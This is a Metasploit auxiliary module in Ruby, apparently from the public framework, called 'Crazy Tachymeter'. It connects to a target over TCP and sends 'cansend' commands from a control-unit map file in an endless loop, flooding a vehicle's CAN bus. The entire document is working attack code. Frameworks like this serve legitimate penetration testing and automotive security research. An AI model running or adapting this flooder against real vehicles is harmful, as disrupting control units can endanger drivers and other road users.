##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Crazy Tachymeter',
      'Description'    => %q{
        With this tool you can flood the CAN-Bus.
        Just pass a file.txt with the control unit map.
      },
      'Author'         => ['Pietro Biondi'],
      'DisclosureDate' => 'May 18 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      )
    )
    register_options([
      OptInt.new('RPORT', [ true, 'The target port']),
      OptString.new('INTERFACE', [true, 'Interface of CAN-Bus']),
      OptString.new('FILEMAP', [true, 'Path to FILEMAP', ::File.join(Msf::Config.data_directory, 'wordlists', 'controlUnitMapCanBus.txt')])
    ])
  end

  def run
    connect
    print_status("Connected to #{rhost}:#{rport}...")
    print_status(' -- OPENING CONTROL UNIT MAP --')
    lines = []
    f = File.open(datastore['FILEMAP'], "rb")
    f.each_line do |line|
      lines.push(line)
    end
    f.close
    print_status(' -- Flooding -- ')
    while 1
      lines.each_with_index{
        |e, i|
        cmd = "cansend #{datastore['INTERFACE']} #{e}"
        sock.put(cmd)
      }
    end
  end
end
